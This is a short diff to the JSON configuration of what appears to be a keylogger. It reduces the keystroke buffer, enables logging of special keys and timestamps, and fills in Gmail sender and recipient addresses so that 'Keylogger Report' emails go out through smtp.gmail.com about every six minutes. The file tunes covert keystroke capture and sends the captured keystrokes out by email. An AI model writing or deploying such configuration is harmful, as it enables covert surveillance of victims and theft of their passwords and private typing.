@@ -6,7 +6,7 @@
     },
     "keylogger": {
         "enabled": true,
-        "buffer_size": 100,
+        "buffer_size": 20,
         "flush_interval_minutes": 5,
         "log_special_keys": true,
         "log_timestamps": true,
@@ -60,9 +60,9 @@
         "smtp_server": "smtp.gmail.com",
         "smtp_port": 587,
         "use_tls": true,
-        "sender_email": "sender_email",
+        "sender_email": "sender_email@gmail.com",
         "sender_password": "your_app_password",
-        "recipient_email": "recipient_email",
+        "recipient_email": "recipient_email@gmail.com",
         "subject_prefix": "Keylogger Report",
         "send_interval_hours": 0.1
     },
